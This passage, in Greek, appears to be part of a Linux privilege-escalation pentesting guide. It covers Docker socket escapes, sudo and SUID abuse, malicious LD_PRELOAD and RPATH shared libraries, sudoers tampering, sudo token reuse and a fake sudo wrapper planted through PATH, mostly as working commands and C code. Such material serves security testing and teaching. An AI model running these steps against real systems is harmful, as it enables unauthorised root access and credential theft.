Αυτές οι εντολές σας επιτρέπουν να τρέξετε ένα container με root-level access στο host filesystem.

#### **Χρήση του Docker API απευθείας**

Σε περιπτώσεις όπου το Docker CLI δεν είναι διαθέσιμο, το Docker socket μπορεί ακόμη να χειριστεί μέσω του Docker API και εντολών `curl`.

1.  **List Docker Images:** Ανάκτηση της λίστας των διαθέσιμων images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Στείλτε ένα αίτημα για να δημιουργήσετε ένα container που προσαρτά το root directory του host συστήματος.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Χρησιμοποιήστε το `socat` για να δημιουργήσετε μια σύνδεση στο container, επιτρέποντας την εκτέλεση εντολών εντός αυτού.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Αφού ρυθμίσετε τη σύνδεση `socat`, μπορείτε να εκτελείτε εντολές απευθείας μέσα στο container με root-level πρόσβαση στο host filesystem.

### Άλλα

Σημειώστε ότι αν έχετε δικαιώματα εγγραφής στο docker socket επειδή είστε **μέσα στην ομάδα `docker`**, έχετε [**περισσότερους τρόπους για κλιμάκωση προνομίων**](interesting-groups-linux-pe/index.html#docker-group). Αν ο [**docker API ακούει σε μια θύρα**](../../network-services-pentesting/2375-pentesting-docker.md#compromising) μπορείτε επίσης να τον παραβιάσετε.

Δείτε **περισσότερους τρόπους για να κάνετε break out από το docker ή να το καταχραστείτε για κλιμάκωση προνομίων** στο:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) κλιμάκωση προνομίων

Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`ctr`**, διαβάστε την ακόλουθη σελίδα καθώς **ενδέχεται να μπορείτε να την καταχραστείτε για κλιμάκωση προνομίων**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** κλιμάκωση προνομίων

Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`runc`**, διαβάστε την ακόλουθη σελίδα καθώς **ενδέχεται να μπορείτε να την καταχραστείτε για κλιμάκωση προνομίων**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

Το D-Bus είναι ένα προηγμένο inter-Process Communication (IPC) σύστημα που επιτρέπει στις εφαρμογές να αλληλεπιδρούν και να μοιράζονται δεδομένα αποδοτικά. Σχεδιασμένο με γνώμονα το σύγχρονο Linux σύστημα, προσφέρει ένα στιβαρό πλαίσιο για διάφορες μορφές επικοινωνίας μεταξύ εφαρμογών.

Το σύστημα είναι ευέλικτο, υποστηρίζοντας βασικό IPC που βελτιώνει την ανταλλαγή δεδομένων μεταξύ διεργασιών, παρόμοιο με βελτιωμένα UNIX domain sockets. Επιπλέον, βοηθά στη μετάδοση γεγονότων ή σημάτων, προάγοντας την ομαλή ενσωμάτωση μεταξύ στοιχείων του συστήματος. Για παράδειγμα, ένα σήμα από έναν Bluetooth daemon σχετικά με μια εισερχόμενη κλήση μπορεί να προκαλέσει σε έναν music player να κάνει mute, βελτιώνοντας την εμπειρία χρήστη. Επιπλέον, το D-Bus υποστηρίζει ένα σύστημα απομακρυσμένων αντικειμένων, απλοποιώντας τα αιτήματα υπηρεσιών και τις κλήσεις μεθόδων μεταξύ εφαρμογών, διευκολύνοντας διαδικασίες που παραδοσιακά ήταν πολύπλοκες.

Το D-Bus λειτουργεί με ένα μοντέλο **allow/deny**, διαχειριζόμενο τα δικαιώματα μηνυμάτων (κλήσεις μεθόδων, εκπομπές σημάτων κ.λπ.) βάσει του σωρευτικού αποτελέσματος των αντίστοιχων κανόνων πολιτικής. Αυτές οι πολιτικές καθορίζουν τις αλληλεπιδράσεις με το bus, ενδέχεται να επιτρέψουν κλιμάκωση προνομίων μέσω της εκμετάλλευσης αυτών των δικαιωμάτων.

Παρατίθεται ένα παράδειγμα τέτοιας πολιτικής στο `/etc/dbus-1/system.d/wpa_supplicant.conf`, που περιγράφει τα δικαιώματα για τον χρήστη root να κατέχει, να στέλνει και να λαμβάνει μηνύματα από το `fi.w1.wpa_supplicant1`.

Πολιτικές χωρίς καθορισμένο user ή group εφαρμόζονται καθολικά, ενώ οι πολιτικές στο πλαίσιο "default" εφαρμόζονται σε όλους όσοι δεν καλύπτονται από άλλες συγκεκριμένες πολιτικές.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Μάθε πώς να enumerate και να exploit μια D-Bus communication εδώ:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Δίκτυο**

Είναι πάντα ενδιαφέρον να enumerate το δίκτυο και να προσδιορίσεις τη θέση της μηχανής.

### Γενική ανίχνευση
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Ανοιχτά ports

Ελέγχετε πάντα τις υπηρεσίες δικτύου που τρέχουν στη μηχανή και με τις οποίες δεν καταφέρατε να αλληλεπιδράσετε πριν αποκτήσετε πρόσβαση σε αυτήν:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Έλεγξε αν μπορείς να sniff traffic. Αν μπορείς, μπορείς να αποκτήσεις κάποια credentials.
```
timeout 1 tcpdump
```
## Χρήστες

### Γενική Εξέταση

Ελέγξτε **ποιος** είστε, ποιες **privileges** έχετε, ποιοι **χρήστες** υπάρχουν στα συστήματα, ποιοι μπορούν να **login** και ποιοι έχουν **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Μεγάλο UID

Κάποιες εκδόσεις του Linux επηρεάστηκαν από ένα bug που επιτρέπει σε χρήστες με **UID > INT_MAX** να αποκτήσουν αυξημένα προνόμια. Περισσότερες πληροφορίες: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) και [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Εκμεταλλευτείτε το** χρησιμοποιώντας: **`systemd-run -t /bin/bash`**

### Ομάδες

Ελέγξτε αν είστε **μέλος κάποιας ομάδας** που θα μπορούσε να σας παραχωρήσει δικαιώματα root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Πρόχειρο

Ελέγξτε αν υπάρχει κάτι ενδιαφέρον στο πρόχειρο (αν είναι δυνατόν)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Πολιτική Κωδίκων
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Γνωστοί κωδικοί πρόσβασης

Αν **γνωρίζετε οποιονδήποτε κωδικό πρόσβασης** του περιβάλλοντος, **δοκιμάστε να συνδεθείτε ως κάθε χρήστης** χρησιμοποιώντας τον κωδικό.

### Su Brute

Αν δεν σας πειράζει να δημιουργήσετε πολύ θόρυβο και τα δυαδικά `su` και `timeout` είναι παρόντα στον υπολογιστή, μπορείτε να δοκιμάσετε να κάνετε brute-force έναν χρήστη χρησιμοποιώντας [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) με την παράμετρο `-a` προσπαθεί επίσης να κάνει brute-force σε χρήστες.

## Καταχρήσεις εγγράψιμου PATH

### $PATH

Αν διαπιστώσετε ότι μπορείτε **να γράψετε μέσα σε κάποιο φάκελο του $PATH**, μπορεί να μπορέσετε να αυξήσετε προνόμια δημιουργώντας **ένα backdoor μέσα στον εγγράψιμο φάκελο** με το όνομα κάποιας εντολής που πρόκειται να εκτελεστεί από διαφορετικό χρήστη (κατά προτίμηση root) και που **δεν φορτώνεται από φάκελο που βρίσκεται πριν** από τον εγγράψιμο φάκελό σας στο $PATH.

### SUDO και SUID

Μπορεί να σας επιτρέπεται να εκτελέσετε κάποια εντολή χρησιμοποιώντας sudo ή αυτές μπορεί να έχουν το suid bit. Ελέγξτε το χρησιμοποιώντας:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Κάποιες **απροσδόκητες εντολές σας επιτρέπουν να διαβάσετε και/ή να γράψετε αρχεία ή ακόμα και να εκτελέσετε μια εντολή.** Για παράδειγμα:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Η ρύθμιση του Sudo μπορεί να επιτρέψει σε έναν χρήστη να εκτελέσει κάποια εντολή με τα προνόμια άλλου χρήστη χωρίς να γνωρίζει τον κωδικό πρόσβασης.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Σε αυτό το παράδειγμα ο χρήστης `demo` μπορεί να εκτελέσει το `vim` ως `root`. Είναι πλέον απλό να αποκτήσει κανείς ένα shell προσθέτοντας ένα ssh key στον κατάλογο root ή εκτελώντας `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Αυτή η οδηγία επιτρέπει στον χρήστη να **ορίσει μια μεταβλητή περιβάλλοντος** ενώ εκτελεί κάτι:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Αυτό το παράδειγμα, **based on HTB machine Admirer**, ήταν **ευάλωτο** σε **PYTHONPATH hijacking** για να φορτώσει μια αυθαίρετη python βιβλιοθήκη κατά την εκτέλεση του script ως root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV διατηρείται μέσω sudo env_keep → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- Γιατί λειτουργεί: Για μη-διαδραστικά shells, Bash αξιολογεί `$BASH_ENV` και κάνει source αυτό το αρχείο πριν εκτελέσει το στοχευμένο script. Πολλοί κανόνες sudo επιτρέπουν την εκτέλεση ενός script ή ενός shell wrapper. Εάν το `BASH_ENV` διατηρείται από το sudo, το αρχείο σου γίνεται source με προνόμια root.

- Απαιτήσεις:
- Ένας κανόνας sudo που μπορείς να τρέξεις (οποιοδήποτε target που καλεί `/bin/bash` μη-διαδραστικά, ή οποιοδήποτε bash script).
- Το `BASH_ENV` παρόν στο `env_keep` (έλεγξε με `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Σκληροποίηση:
- Αφαιρέστε `BASH_ENV` (και `ENV`) από `env_keep`, προτιμήστε `env_reset`.
- Αποφύγετε shell wrappers για εντολές που επιτρέπονται από sudo· χρησιμοποιήστε ελάχιστα binaries.
- Εξετάστε sudo I/O logging και ειδοποίηση όταν χρησιμοποιούνται διατηρούμενες μεταβλητές περιβάλλοντος.

### Διαδρομές παράκαμψης εκτέλεσης με sudo

**Μεταβείτε** για να διαβάσετε άλλα αρχεία ή να χρησιμοποιήσετε **symlinks**. Για παράδειγμα στο αρχείο sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Αν χρησιμοποιηθεί **wildcard** (\*), γίνεται ακόμα πιο εύκολο:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Αντιμετώπιση**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary χωρίς καθορισμένη διαδρομή εντολής

Εάν η **άδεια sudo** έχει δοθεί για μια μεμονωμένη εντολή **χωρίς να καθορίζεται η διαδρομή**: _hacker10 ALL= (root) less_ μπορείτε να την εκμεταλλευτείτε αλλάζοντας τη μεταβλητή PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Αυτή η τεχνική μπορεί επίσης να χρησιμοποιηθεί αν ένα **suid** binary **εκτελεί άλλη εντολή χωρίς να καθορίζει τη διαδρομή προς αυτήν (ελέγξτε πάντα με** _**strings**_ **το περιεχόμενο ενός περίεργου SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary με καθορισμένη διαδρομή εντολής

Αν το **suid** binary **εκτελεί άλλη εντολή καθορίζοντας τη διαδρομή**, τότε μπορείτε να δοκιμάσετε να **export a function** με το όνομα της εντολής που καλεί το suid αρχείο.

For example, if a suid binary calls _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Then, όταν καλέσετε το suid binary, αυτή η συνάρτηση θα εκτελεστεί

### LD_PRELOAD & **LD_LIBRARY_PATH**

Η μεταβλητή περιβάλλοντος **LD_PRELOAD** χρησιμοποιείται για να καθορίσει μία ή περισσότερες shared libraries (.so files) που θα φορτωθούν από τον loader πριν από όλες τις άλλες, συμπεριλαμβανομένης της standard C library (`libc.so`). Αυτή η διαδικασία είναι γνωστή ως preloading μιας βιβλιοθήκης.

Ωστόσο, για να διατηρηθεί η ασφάλεια του συστήματος και να αποτραπεί η εκμετάλλευση αυτής της δυνατότητας, ιδιαίτερα με εκτελέσιμα **suid/sgid**, το σύστημα επιβάλλει ορισμένες προϋποθέσεις:

- Ο loader αγνοεί **LD_PRELOAD** για εκτελέσιμα όπου το πραγματικό user ID (_ruid_) δεν αντιστοιχεί στο effective user ID (_euid_).
- Για εκτελέσιμα με suid/sgid, προφορτώνονται μόνο βιβλιοθήκες που βρίσκονται σε standard paths και επίσης έχουν suid/sgid.

Μπορεί να προκύψει privilege escalation αν έχετε τη δυνατότητα να εκτελέσετε εντολές με `sudo` και η έξοδος του `sudo -l` περιέχει τη δήλωση **env_keep+=LD_PRELOAD**. Αυτή η ρύθμιση επιτρέπει στη μεταβλητή περιβάλλοντος **LD_PRELOAD** να παραμένει και να αναγνωρίζεται ακόμη και όταν οι εντολές εκτελούνται με `sudo`, ενδεχομένως οδηγώντας στην εκτέλεση αυθαίρετου κώδικα με αυξημένα προνόμια.
```
Defaults        env_keep += LD_PRELOAD
```
Αποθηκεύστε ως **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Στη συνέχεια **μεταγλωττίστε το** χρησιμοποιώντας:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Τελικά, **escalate privileges** τρέχοντας
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Μια παρόμοια privesc μπορεί να εκμεταλλευτεί εάν ο attacker ελέγχει την env variable **LD_LIBRARY_PATH**, επειδή ελέγχει τη διαδρομή όπου θα αναζητηθούν οι βιβλιοθήκες.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Όταν συναντάτε ένα binary με δικαιώματα **SUID** που φαίνεται ασυνήθιστο, είναι καλή πρακτική να ελέγχετε αν φορτώνει σωστά αρχεία **.so**. Αυτό μπορεί να ελεγχθεί τρέχοντας την ακόλουθη εντολή:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Για παράδειγμα, η εμφάνιση ενός σφάλματος όπως _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ υποδεικνύει πιθανότητα για εκμετάλλευση.

Για να το εκμεταλλευτείτε, θα προχωρούσατε δημιουργώντας ένα αρχείο C, π.χ. _"/path/to/.config/libcalc.c"_, που περιέχει τον ακόλουθο κώδικα:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Αυτός ο κώδικας, μόλις μεταγλωττιστεί και εκτελεστεί, στοχεύει να elevate privileges με την τροποποίηση των δικαιωμάτων αρχείων και την εκτέλεση ενός shell με elevated privileges.

Μεταγλωττίστε το παραπάνω C αρχείο σε shared object (.so) αρχείο με:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Τελικά, η εκτέλεση του επηρεασμένου SUID binary θα πρέπει να ενεργοποιήσει το exploit, επιτρέποντας πιθανή παραβίαση του συστήματος.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Τώρα που έχουμε βρει ένα SUID binary που φορτώνει μια library από έναν φάκελο όπου μπορούμε να γράψουμε, ας δημιουργήσουμε τη library σε αυτόν τον φάκελο με το απαραίτητο όνομα:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Εάν λάβετε ένα σφάλμα όπως
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) είναι μια επιμελημένη λίστα Unix binaries που μπορούν να αξιοποιηθούν από έναν επιτιθέμενο για να παρακάμψουν τοπικούς περιορισμούς ασφαλείας. [**GTFOArgs**](https://gtfoargs.github.io/) είναι το ίδιο αλλά για περιπτώσεις όπου μπορείτε **να εισάγετε μόνο arguments** σε μια εντολή.

Το project συλλέγει νόμιμες λειτουργίες των Unix binaries που μπορούν να καταχραστούν για να διαφύγουν από restricted shells, να escalate ή να διατηρήσουν elevated privileges, να μεταφέρουν αρχεία, να spawn bind και reverse shells, και να διευκολύνουν άλλες post-exploitation εργασίες.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Αν μπορείτε να εκτελέσετε `sudo -l` μπορείτε να χρησιμοποιήσετε το εργαλείο [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) για να ελέγξετε αν βρίσκει τρόπο να εκμεταλλευτεί οποιονδήποτε κανόνα sudo.

### Επαναχρησιμοποίηση Sudo Tokens

Σε περιπτώσεις όπου έχετε **sudo access** αλλά όχι τον κωδικό, μπορείτε να escalate privileges περιμένοντας την εκτέλεση μιας εντολής sudo και στη συνέχεια hijacking το session token.

Requirements to escalate privileges:

- Έχετε ήδη ένα shell ως χρήστης "_sampleuser_"
- "_sampleuser_" έχει **χρησιμοποιήσει `sudo`** για να εκτελέσει κάτι στα **τελευταία 15 λεπτά** (από προεπιλογή αυτή είναι η διάρκεια του sudo token που μας επιτρέπει να χρησιμοποιήσουμε `sudo` χωρίς να εισάγουμε κωδικό)
- `cat /proc/sys/kernel/yama/ptrace_scope` έχει τιμή 0
- `gdb` είναι προσβάσιμο (θα πρέπει να μπορείτε να το ανεβάσετε)

(Μπορείτε προσωρινά να ενεργοποιήσετε το ptrace_scope με `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ή μόνιμα τροποποιώντας `/etc/sysctl.d/10-ptrace.conf` και ορίζοντας `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Το **πρώτο exploit** (`exploit.sh`) θα δημιουργήσει το binary `activate_sudo_token` στο _/tmp_. Μπορείτε να το χρησιμοποιήσετε για να **ενεργοποιήσετε το sudo token στη συνεδρία σας** (δεν θα πάρετε αυτόματα root shell, εκτελέστε `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Το **δεύτερο exploit** (`exploit_v2.sh`) θα δημιουργήσει ένα sh shell στο _/tmp_ **που ανήκει στον root με setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Ο **τρίτος exploit** (`exploit_v3.sh`) θα **δημιουργήσει ένα sudoers file** που κάνει **τα sudo tokens αιώνια και επιτρέπει σε όλους τους χρήστες να χρησιμοποιούν sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Εάν έχετε **write permissions** στον φάκελο ή σε οποιοδήποτε από τα αρχεία που δημιουργήθηκαν εντός αυτού, μπορείτε να χρησιμοποιήσετε το binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) για να **create a sudo token for a user and PID**.\
Για παράδειγμα, αν μπορείτε να overwrite το αρχείο _/var/run/sudo/ts/sampleuser_ και έχετε ένα shell ως ο εν λόγω user με PID 1234, μπορείτε να **obtain sudo privileges** χωρίς να χρειάζεται να γνωρίζετε το password κάνοντας:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Το αρχείο `/etc/sudoers` και τα αρχεία μέσα στο `/etc/sudoers.d` διαμορφώνουν ποιος μπορεί να χρησιμοποιήσει το `sudo` και πώς. Αυτά τα αρχεία **από προεπιλογή μπορούν να διαβαστούν μόνο από τον χρήστη root και την ομάδα root**.\
**Αν** μπορείτε να **διαβάσετε** αυτό το αρχείο μπορεί να είστε σε θέση να **αποκτήσετε μερικές ενδιαφέρουσες πληροφορίες**, και αν μπορείτε να **γράψετε** οποιοδήποτε αρχείο θα μπορέσετε να **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Αν μπορείς να γράψεις, μπορείς να καταχραστείς αυτή την άδεια
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ένας άλλος τρόπος κατάχρησης αυτών των δικαιωμάτων:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Υπάρχουν μερικές εναλλακτικές στο binary `sudo` όπως το `doas` για το OpenBSD, θυμηθείτε να ελέγξετε τη διαμόρφωσή του στο `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Αν ξέρετε ότι ένας **χρήστης συνήθως συνδέεται σε μια μηχανή και χρησιμοποιεί `sudo`** για να αυξήσει τα προνόμια και έχετε ένα shell μέσα στο context αυτού του χρήστη, μπορείτε να **δημιουργήσετε ένα νέο εκτελέσιμο sudo** που θα εκτελέσει τον κώδικά σας ως root και στη συνέχεια την εντολή του χρήστη. Έπειτα, **τροποποιήστε το $PATH** του context του χρήστη (για παράδειγμα προσθέτοντας το νέο path στο .bash_profile) ώστε όταν ο χρήστης εκτελεί sudo, να εκτελείται το εκτελέσιμο sudo που δημιουργήσατε.

Σημειώστε ότι αν ο χρήστης χρησιμοποιεί διαφορετικό shell (όχι bash) θα χρειαστεί να τροποποιήσετε άλλα αρχεία για να προσθέσετε το νέο path. Για παράδειγμα [ sudo-piggyback](https://github.com/APTy/sudo-piggyback) τροποποιεί `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Μπορείτε να βρείτε ένα άλλο παράδειγμα στο [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ή εκτελώντας κάτι όπως:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Το αρχείο `/etc/ld.so.conf` υποδεικνύει **από πού προέρχονται τα φορτωμένα αρχεία ρυθμίσεων**. Συνήθως, αυτό το αρχείο περιέχει την εξής διαδρομή: `include /etc/ld.so.conf.d/*.conf`

Αυτό σημαίνει ότι τα αρχεία ρυθμίσεων από `/etc/ld.so.conf.d/*.conf` θα διαβαστούν. Αυτά τα αρχεία ρυθμίσεων **δείχνουν σε άλλους φακέλους** όπου **βιβλιοθήκες** θα **αναζητηθούν**. Για παράδειγμα, το περιεχόμενο του `/etc/ld.so.conf.d/libc.conf` είναι `/usr/local/lib`. **Αυτό σημαίνει ότι το σύστημα θα αναζητήσει βιβλιοθήκες μέσα στο `/usr/local/lib`**.

Εάν για κάποιο λόγο **ένας χρήστης έχει δικαιώματα εγγραφής** σε οποιαδήποτε από τις ενδεικνυόμενες διαδρομές: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, οποιοδήποτε αρχείο μέσα στο `/etc/ld.so.conf.d/` ή οποιονδήποτε φάκελο που αναφέρεται στο αρχείο ρυθμίσεων μέσα στο `/etc/ld.so.conf.d/*.conf` μπορεί να είναι σε θέση να αποκτήσει ανύψωση προνομίων.\
Δείτε **πώς να εκμεταλλευτείτε αυτή τη λανθασμένη ρύθμιση** στην παρακάτω σελίδα:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Με την αντιγραφή της lib στο `/var/tmp/flag15/` θα χρησιμοποιηθεί από το πρόγραμμα σε αυτή τη θέση όπως ορίζεται στη μεταβλητή `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Στη συνέχεια, δημιουργήστε μια κακόβουλη βιβλιοθήκη στο `/var/tmp` με `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Δυνατότητες

